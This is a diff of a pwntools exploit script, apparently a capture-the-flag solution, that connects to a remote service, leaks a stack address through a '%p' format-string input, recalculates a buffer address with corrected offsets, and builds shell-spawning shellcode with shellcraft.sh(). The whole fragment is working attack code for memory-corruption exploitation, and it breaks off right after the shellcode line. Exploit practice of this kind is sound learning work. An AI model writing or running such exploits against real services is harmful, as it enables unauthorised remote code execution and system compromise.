@@ -33,7 +33,7 @@ PORT = 16004
 
 RET_ADDR = 0x178 #-0x178(rbp)
 BUF_ADDR = 0x170 #-0x170(rbp)
-FORMATTED_ADDR = 0x48 #-0x48(rbp)
+FORMATTED_ADDR = 0x4a #-0x4a(rbp)
 
 conn = remote(HOST, PORT)
 now = int(time.time())
@@ -50,12 +50,12 @@ sendline(conn, f'{nhonks}')
 
 readuntil(conn, 'what\'s your name again?')
 
-sendline(conn, '<BUF>%p<BUF>') #this should give us %rsi <--- which contains -0x48(%rbp)
+sendline(conn, '<BUF>%p<BUF>') #this should give us %rsi <--- which contains -0x4a(%rbp)
 
 line = readuntil(conn, 'leave to the world?')
 
 match = re.search(r'<BUF>0x[0-9a-fA-F]+<BUF>', line)
-buf_addr = int(match.group(0).split('<BUF>')[1], 16) - (FORMATTED_ADDR - BUF_ADDR)
+buf_addr = int(match.group(0).split('<BUF>')[1], 16) - (BUF_ADDR - FORMATTED_ADDR)
 print(f'[DEGUB] {hex(buf_addr)=}')
 
 shellcode = asm(shellcraft.sh()) 
